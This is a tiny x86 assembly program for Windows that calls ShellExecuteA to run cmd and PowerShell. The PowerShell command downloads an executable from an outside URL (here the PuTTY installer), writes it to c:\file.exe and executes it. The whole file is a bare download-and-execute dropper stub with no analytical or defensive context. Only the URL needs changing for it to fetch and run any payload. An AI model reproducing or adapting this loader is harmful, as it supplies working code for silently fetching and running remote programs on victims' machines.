extern _ShellExecuteA
global _main

section .data
    tipo db "open",0
    cmd db "cmd",0
    par db "/c powershell -Command wget 'https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe' -Outfile c:\file.exe ; c:\file.exe ",0

section .text
_main:
    push 0
    push 0
    push par
    push cmd
    push tipo
    push 0
    call _ShellExecuteA

